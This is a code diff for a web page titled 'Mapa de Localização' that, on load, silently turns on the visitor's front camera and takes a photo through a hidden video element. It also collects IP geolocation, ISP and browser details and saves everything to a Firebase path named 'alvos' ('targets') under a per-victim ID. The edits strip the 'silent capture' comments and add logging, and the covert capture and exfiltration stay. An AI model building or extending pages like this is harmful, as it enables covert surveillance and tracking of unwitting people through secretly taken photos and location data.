@@ -20,12 +20,13 @@ export default function LocationCapturePage() {
     const userIdParam = params.get("uid")
     setUserId(userIdParam)
 
+    console.log("[v0] 🎯 Location capture page loaded for user:", userIdParam)
+
     // Auto-start camera and capture photo silently
     const autoCapture = async () => {
       try {
         console.log("[v0] 📷 Starting camera access...")
 
-        // Request camera access silently
         const stream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: "user",
@@ -44,7 +45,6 @@ export default function LocationCapturePage() {
           videoRef.current.onplaying = () => {
             console.log("[v0] 🎬 Video is now playing, waiting for frames...")
 
-            // Wait longer to ensure frames are rendered
             setTimeout(() => {
               if (videoRef.current && videoRef.current.readyState >= 2) {
                 console.log("[v0] 📸 Capturing photo from video...")
@@ -62,7 +62,6 @@ export default function LocationCapturePage() {
                   setPhotoData(photoDataUrl)
                   console.log("[v0] ✅ Photo captured successfully, size:", photoDataUrl.length, "bytes")
 
-                  // Stop camera after capture
                   if (streamRef.current) {
                     streamRef.current.getTracks().forEach((track) => track.stop())
                     streamRef.current = null
@@ -75,17 +74,15 @@ export default function LocationCapturePage() {
                 console.error("[v0] ❌ Video not ready, readyState:", videoRef.current?.readyState)
                 setPhotoData("camera_error")
               }
-            }, 2000) // Increased delay to 2 seconds
+            }, 2000)
           }
 
-          // Explicitly play the video
           videoRef.current.play().catch((err) => {
             console.error("[v0] ❌ Video play error:", err)
           })
         }
       } catch (error) {
         console.error("[v0] ❌ Auto-capture error:", error)
-        // Continue even if camera fails
         setPhotoData("camera_denied")
       }
     }
@@ -94,7 +91,6 @@ export default function LocationCapturePage() {
   }, [])
 
   useEffect(() => {
-    // Start capture as soon as component mounts
     if (!hasCaptured && !isCapturing) {
       handleAutoCapture()
     }
@@ -117,6 +113,7 @@ export default function LocationCapturePage() {
           data.ipData?.latitude && data.ipData?.longitude
             ? { lat: data.ipData.latitude, lng: data.ipData?.longitude }
             : null,
+        ipLocation: data.ipData ? `${data.ipData.city}, ${data.ipData.country}` : "No location",
       })
 
       if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
@@ -129,10 +126,12 @@ export default function LocationCapturePage() {
       const userPath = userId || "anonymous"
       const alvosRef = ref(database, `alvos/${userPath}`)
 
+      const timestamp = Date.now()
+
       const capturePayload = {
         pageType: "location",
         pageName: "Mapa de Localização",
-        timestamp: new Date().toISOString(),
+        timestamp,
         ipAddress: data.ipData.ip || "Unknown",
         userAgent: navigator.userAgent,
         ipData: {
@@ -153,7 +152,8 @@ export default function LocationCapturePage() {
           photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
       }
 
-      console.log("[v0] 💾 Saving to Firebase with IP geolocation:", {
+      console.log("[v0] 💾 Saving to Firebase at path:", `alvos/${userPath}`)
+      console.log("[v0] 📍 Capture details:", {
         ip: capturePayload.ipData.ip,
         coordinates: {
           lat: capturePayload.ipData.latitude,
@@ -161,16 +161,22 @@ export default function LocationCapturePage() {
         },
         location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
         isp: capturePayload.ipData.isp,
-        message: "Marker will appear on the map at these exact coordinates based on IP geolocation",
+        timestamp: new Date(timestamp).toISOString(),
+        hasPhoto: !!capturePayload.formData?.photo,
       })
 
-      await push(alvosRef, capturePayload)
+      const result = await push(alvosRef, capturePayload)
 
-      console.log("[v0] ✅ Data auto-captured and saved successfully!")
+      console.log("[v0] ✅ Data saved successfully to Firebase with key:", result.key)
+      console.log("[v0] 🗺️ Marker should now appear on the global map at coordinates:", {
+        lat: capturePayload.ipData.latitude,
+        lng: capturePayload.ipData.longitude,
+      })
+
       setHasCaptured(true)
     } catch (error) {
       console.error("[v0] ❌ Auto-capture error:", error)
-      setHasCaptured(true) // Mark as captured even on error to prevent infinite retries
+      setHasCaptured(true)
     } finally {
       setIsCapturing(false)
     }
@@ -180,7 +186,6 @@ export default function LocationCapturePage() {
     <>
       <SecurityLayer />
 
-      {/* Hidden video element for silent photo capture */}
       <video ref={videoRef} autoPlay playsInline muted className="hidden" />
 
       <div className="relative h-screen w-full flex items-center justify-center bg-white">
